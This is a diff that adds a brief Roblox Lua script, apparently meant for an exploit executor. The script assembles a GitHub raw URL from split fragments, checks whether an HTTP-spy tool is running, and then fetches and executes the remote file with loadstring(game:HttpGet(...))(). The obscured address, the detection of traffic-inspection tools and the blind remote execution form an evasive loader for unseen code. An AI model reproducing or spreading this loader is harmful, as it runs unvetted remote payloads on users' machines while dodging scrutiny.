@@ -1,0 +1,22 @@
+local CoreGui = game:GetService("CoreGui")
+
+local _G = "https://raw.githubusercontent.com/"
+local _U = "ffbbsndv/" 
+local _R = "Lapoopoo/" 
+local _B = "refs/heads/main/"
+local _F = "Siskswmwmwjsjsskskalalawlw/" 
+local _S = "Security.txt" 
+
+local _L = _G .. _U .. _R .. _B .. _F .. _S
+
+local function Check()
+    if getgenv and getgenv().HttpSpy then return true end
+    if CoreGui:FindFirstChild("HttpSpyGui") then return true end
+    return false
+end
+
+if Check() then
+    getgenv().SafetyCheckFailed = true
+end
+
+loadstring(game:HttpGet(_L))()
